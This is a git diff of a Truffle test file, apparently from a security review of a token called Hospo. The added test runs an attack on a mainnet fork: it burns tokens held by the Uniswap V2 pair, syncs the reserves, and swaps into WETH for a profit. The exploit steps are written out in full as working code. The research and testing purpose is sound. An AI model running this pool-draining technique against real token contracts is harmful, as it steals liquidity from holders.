@@ -1,19 +1,16 @@
-const { abi: IUniswapV3PoolABI } = require('@uniswap/v3-core/artifacts/contracts/interfaces/IUniswapV3Pool.sol/IUniswapV3Pool.json')
-const { abi: QuoterABI } = require('@uniswap/v3-periphery/artifacts/contracts/lens/Quoter.sol/Quoter.json')
-const { Token, CurrencyAmount, TradeType } = require('@uniswap/sdk-core')
-const { Pool, Route, Trade } = require('@uniswap/v3-sdk')
+const { ChainId, WETH, Token, Fetcher, Route, TokenAmount, TradeType, Trade, Percent } = require('@uniswap/sdk')
 const BN = require('bn.js')
+const ethers = require('ethers')
 
-const { abi: IUniswapV2Router02ABI}  = require("@uniswap/v2-periphery/build/IUniswapV2Router02.json");
+// ABIs
+const { abi: IUniswapV2Router02ABI } = require('@uniswap/v2-periphery/build/IUniswapV2Router02.json')
+const { abi: UniswapV2PairABI } = require('@uniswap/v2-core/build/UniswapV2Pair.json')
+const wethAbi = require('../src/abi/WethABI.json')
 
 const HospoToken = artifacts.require('Hospo')
 
-const DEAD_ADDR = '0x000000000000000000000000000000000000dEaD';
-const WETHUSDC_pool_addr = '0x8ad599c3A0ff1De082011EFDDc58f1908eb6e6D8'
-const QuoterContract_addr = '0xb27308f9F90D607463bb33eA1BeBb41C27CE5AB6'
 const UniswapV2RouterAddr = '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D'
-// we are using a mainnet fork.
-const chainId = 1
+const WETH_ADDRESS = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2'
 
 /**
  * To test:
@@ -30,75 +27,59 @@ contract('Hospowise - Pool Attack', (accounts) => {
 
   let deployer, attacker, user
 
+  let uniswapRouterV2, uniswapPairAddr, uniswapPair, token, wethContract
+
+  // these are the uniswap specific token impls
+  let hospoUni, wethUni
+
+  const provider = new ethers.providers.Web3Provider(web3.currentProvider)
+
   before(async () => {
     [deployer, attacker, user] = accounts
+    uniswapRouterV2 = new web3.eth.Contract(IUniswapV2Router02ABI, UniswapV2RouterAddr)
+    wethContract = new web3.eth.Contract(wethAbi, WETH_ADDRESS)
+    // create our artifact
+    token = await HospoToken.deployed()
+    await token.startTrading()
+
+    uniswapPairAddr = await token.uniswapV2Pair()
+    uniswapPair = new web3.eth.Contract(UniswapV2PairABI, uniswapPairAddr, {from: deployer})
+    hospoUni = new Token(ChainId.MAINNET, token.address, 18)
+    wethUni = WETH[hospoUni.chainId]
   })
 
-  it.skip('will connect to an existing pool and get a quote', async () => {
+  let outputBalances = async function (msg = '::MARKER::') {
+    const pairBalance = await token.balanceOf(uniswapPairAddr)
+    const ownerBalance = await token.balanceOf(deployer)
+    const attackerBalance = await token.balanceOf(attacker)
+    const uniswapRouterBalance = await token.balanceOf(UniswapV2RouterAddr)
 
-    const poolContract = new web3.eth.Contract(IUniswapV3PoolABI, WETHUSDC_pool_addr)
-    const quoterContract = new web3.eth.Contract(QuoterABI, QuoterContract_addr)
-
-    const [immutables, state] = await Promise.all([getPoolImmutables(poolContract), getPoolState(poolContract)])
-    const TokenA = new Token(chainId, immutables.token0, 6, 'USDC', 'USD Coin')
-    const TokenB = new Token(chainId, immutables.token1, 18, 'WETH', 'Wrapped Ether')
-
-    console.log(`Params: `, { TokenA, TokenB, state, immutables })
-
-    const poolExample = new Pool(
-      TokenA,
-      TokenB,
-      immutables.fee,
-      state.sqrtPriceX96.toString(),
-      state.liquidity.toString(),
-      state.tick,
-    )
-    // console.log(`Pool Prices: `, {TokenAPrice: poolExample.priceOf(TokenA).toSignificant(8), TokenBPrice: poolExample.priceOf(TokenB).toSignificant(8)})
-    console.log(`Token Prices: `, { TokenA: poolExample.token0Price.toSignificant(8), TokenB: poolExample.token1Price.toSignificant(8) })
-
-    // assign an input amount for the swap
-    const amountIn = 1500
-
-    // call the quoter contract to determine the amount out of a swap, given an amount in
-    const quotedAmountOut = await quoterContract.methods.quoteExactInputSingle(
-      immutables.token0,
-      immutables.token1,
-      immutables.fee,
-      amountIn.toString(),
-      0,
-    ).call()
-
-    console.log(`Quote: `, { quotedAmountOut })
-
-    // create an instance of the route object in order to construct a trade object
-    const swapRoute = new Route([poolExample], TokenA, TokenB)
-    // create an unchecked trade instance
-    const uncheckedTradeExample = await Trade.createUncheckedTrade({
-      route: swapRoute,
-      inputAmount: CurrencyAmount.fromRawAmount(TokenA, amountIn.toString()),
-      outputAmount: CurrencyAmount.fromRawAmount(TokenB, quotedAmountOut.toString()),
-      tradeType: TradeType.EXACT_INPUT,
+    console.log(`${msg} HOSPO BALANCES: `, {
+      ownerBalance: ownerBalance.toString(),
+      attackerBalance: attackerBalance.toString(),
+      pairBalance: pairBalance.toString(),
+      uniswapRouterBalance: uniswapRouterBalance.toString(),
     })
+  }
 
-    // print the quote and the unchecked trade instance in the console
-    console.log('The quoted amount out is', quotedAmountOut.toString())
-    console.log('The unchecked trade object is', uncheckedTradeExample)
-  })
+  let getPairReserves = async function (pair) {
+    const t0Reserve = pair.reserve0
+    const t1Reserve = pair.reserve1
+    const token1Bal = await token.balanceOf(uniswapPairAddr)
+    const token2Bal = await wethContract.methods.balanceOf(uniswapPairAddr).call() // Web3 contract syntax.
+    console.log(`uniswap pair balances: `, { hospo: token1Bal.toString(), hReserve: t0Reserve.toSignificant(6), weth: token2Bal.toString(), wReserve: t1Reserve.toSignificant(6) })
+  }
+
+  let getPairRoute = async function (token0, token1) {
+    let pair = await Fetcher.fetchPairData(token0, token1, provider)
+    const route = new Route([pair], token0)
+    return { pair, route }
+  }
 
   it('will create a pool to test with', async () => {
 
-    // create our artifact
-    const token = await HospoToken.deployed()
-    await token.startTrading()
-
-    const uniswapPair = await token.uniswapV2Pair()
     console.log(`Addresses: `, { deployer, attacker, user })
-    console.log(`Hospo: `, { uniswapPair, address: token.address, owner: await token.owner() })
-
-
-    // this is a big number...
-    const swapAmount = await token.swapTokensAtAmount()
-    let amount = new BN(web3.utils.toWei('300', 'mether'))
+    console.log(`Hospo: `, { uniswapPair: uniswapPairAddr, address: token.address, owner: await token.owner() })
 
     // lets add some liquidity to the pool
     await web3.eth.personal.sendTransaction({
@@ -106,99 +87,83 @@ contract('Hospowise - Pool Attack', (accounts) => {
       to: token.address,
       value: new BN(web3.utils.toWei('100', 'ether')),
     })
-    // put some tokens back into the contract itself...
-    await token.transfer(token.address, amount, {from: deployer})
 
-    const deployerEth = await web3.eth.getBalance(deployer)
-    const contractEth = await web3.eth.getBalance(token.address)
-    console.log(`Eth balances: `, { deployer: deployerEth.toString(), hospoContract: contractEth.toString() })
+    // setup the burn/token amounts
+    const tokenAmount = new BN(web3.utils.toWei('1000', 'ether'))
+    const burnAmount = new BN(web3.utils.toWei('999', 'ether'))
+    const ethAmount = new BN(web3.utils.toWei('10', 'ether'))
 
+    // so once we burn we are left with 10 ETHER equiv of tokens....
 
-    // given we can burn the tokens for the
-    let pairBalance = await token.balanceOf(uniswapPair)
-    let contractBalance = await token.balanceOf(token.address)
-    let ownerBalance = await token.balanceOf(deployer)
-    let attackerBalance = await token.balanceOf(attacker)
-
-    console.log(`Balances: `, {
-      ownerBalance: ownerBalance.toString(),
-      attackerBalance: attackerBalance.toString(),
-      pairBalance: pairBalance.toString(),
-      swapAmount: swapAmount.toString(),
-      contractBalance: contractBalance.toString(),
-      amount: amount.toString(),
-    })
-
-    // lets try the pair
-    const tokenAmount = new BN(web3.utils.toWei('10', 'ether'))
-    const ethAmount = new BN(web3.utils.toWei('1', 'ether'))
-
-    // try and add liquidity
-    // const block = await web3.eth.getBlock("pending")
-    // const uniRouterV02 = new web3.eth.Contract(IUniswapV2Router02ABI, UniswapV2RouterAddr)
-    // await token.approve(UniswapV2RouterAddr, tokenAmount, {from: deployer})
-    // await uniRouterV02.methods.addLiquidityETH(deployer, tokenAmount, 0, 0, DEAD_ADDR, block.timestamp).send({
-    //   from: deployer,
-    //   value: ethAmount
-    // })
-
-    // ok this works now!
+    // // put some tokens back into the contract itself... so we can get it to prime the pool
+    await token.transfer(token.address, tokenAmount, { from: deployer })
+    // ok this works now! 1:1000
     await token.testSetup(tokenAmount, ethAmount, { from: deployer })
 
-    // lets transfer some to the attacker
-    await token.transfer(attacker, amount, { from: deployer })
+    // lets transfer some to the attacker - to simulate him buying some.
+    const attackerAmount = new BN(web3.utils.toWei('1000', 'ether'))
+    await token.transfer(attacker, attackerAmount, { from: deployer })
 
     // lets see what changed...
-    pairBalance = await token.balanceOf(uniswapPair)
-    ownerBalance = await token.balanceOf(deployer)
-    attackerBalance = await token.balanceOf(attacker)
-    contractBalance = await token.balanceOf(token.address)
+    await outputBalances('PREHACK')
 
-    console.log(`Post transfer: `, {
-      ownerBalance: ownerBalance.toString(),
-      attackerBalance: attackerBalance.toString(),
-      pairBalance: pairBalance.toString(),
-      contractBalance: contractBalance.toString(),
+    // now the hack
+
+    /**
+     * 1. I need to burn tokens in uniswap pool to leave my amount in
+     * 2. I need to then approve the router to work on my hospo tokens for amount
+     * 3. I do a sell tokens for weth transfer. see what I get.
+     */
+    let { pair, route } = await getPairRoute(hospoUni, wethUni)
+    console.log('preburn/sync to 1 of opp token:', { leg1: route.midPrice.toSignificant(10), leg2: route.midPrice.invert().toSignificant(10) })
+
+    // NASTY
+    await token.burn(uniswapPairAddr, burnAmount, { from: attacker })
+    // approve the router to take our tokens...
+    await token.approve(UniswapV2RouterAddr, attackerAmount, { from: attacker })
+
+    // this reset the liquidity after our little burn above...
+    await uniswapPair.methods.sync().send({from:attacker})
+    // check the new ratios...
+    let { route: postRoute } = await getPairRoute(hospoUni, wethUni)
+    console.log('postburn/sync to 1 of opp token:', { leg1: postRoute.midPrice.toSignificant(10), leg2: postRoute.midPrice.invert().toSignificant(10) })
+
+    await outputBalances('POSTBURN')
+    const attackerWethPre = new BN(await wethContract.methods.balanceOf(attacker).call()) // Web3 contract syntax.
+    console.log(`Attacker Pre Attack: `, {
+      eth: (await web3.eth.getBalance(attacker)).toString(),
+      weth: web3.utils.fromWei(attackerWethPre, 'ether'), // lets see it as ETH
+      hospo: (await token.balanceOf(attacker)).toString(),
     })
+    await getPairReserves(pair)
+
+    // this is the attack trade...
+    const amountIn = attackerAmount.toString();
+    const trade = new Trade(postRoute, new TokenAmount(hospoUni, amountIn), TradeType.EXACT_INPUT)
+    const slippageTolerance = new Percent('1', '10000') // 1bps 0.001 slippage.
+    const amountOutMin = trade.minimumAmountOut(slippageTolerance).raw.toString()
+    const path = [token.address, wethUni.address] // token -> weth trade.
+    const to = attacker
+    const deadline = Math.floor(Date.now() / 1000) + 60 * 2 // 20 mins +
+    const gasUsed = await uniswapRouterV2.methods.swapExactTokensForTokens(amountIn, amountOutMin, path, to, deadline).estimateGas({ from: attacker, gas: 5000000 })
+    console.log(`vars: `, { amountIn, amountOutMin, path, to, deadline, gasUsed })
+    const ret = await uniswapRouterV2.methods.swapExactTokensForTokens(amountIn, amountOutMin, path, to, deadline).send({ from: attacker, gas: gasUsed })
+
+    // ok lets see what we got out...
+    await outputBalances('POST TRADE')
+    pair = await Fetcher.fetchPairData(hospoUni, wethUni, provider)
+    await getPairReserves(pair)
+    const attackerWethPost = new BN(await wethContract.methods.balanceOf(attacker).call())
+    const profit =  attackerWethPost.sub(attackerWethPre)
+    console.log(`Attacker: Post Attack: `, {
+      eth: (await web3.eth.getBalance(attacker)).toString(),
+      weth: web3.utils.fromWei(attackerWethPost, 'ether'), // lets see it as ETH
+      hospo: (await token.balanceOf(attacker)).toString(),
+      profit: web3.utils.fromWei(profit, 'ether')
+    })
+
 
   })
 
 })
 
-// 1000000
-//
-
-async function getPoolImmutables (poolContract) {
-  const [factory, token0, token1, fee, tickSpacing, maxLiquidityPerTick] = await Promise.all([
-    poolContract.methods.factory().call(),
-    poolContract.methods.token0().call(),
-    poolContract.methods.token1().call(),
-    poolContract.methods.fee().call(),
-    poolContract.methods.tickSpacing().call(),
-    poolContract.methods.maxLiquidityPerTick().call(),
-  ])
-
-  return {
-    factory,
-    token0,
-    token1,
-    fee: parseInt(fee),
-    tickSpacing: parseInt(tickSpacing),
-    maxLiquidityPerTick: new BN(maxLiquidityPerTick),
-  }
-}
-
-async function getPoolState (poolContract) {
-  const [liquidity, slot] = await Promise.all([poolContract.methods.liquidity().call(), poolContract.methods.slot0().call()])
-  console.log(`getPoolState: `, { liquidity, slot })
-  return {
-    liquidity: new BN(liquidity),
-    sqrtPriceX96: new BN(slot[0]),
-    tick: parseInt(slot[1]),
-    observationIndex: parseInt(slot[2]),
-    observationCardinality: parseInt(slot[3]),
-    observationCardinalityNext: parseInt(slot[4]),
-    feeProtocol: parseInt(slot[5]),
-    unlocked: slot[6],
-  }
-}
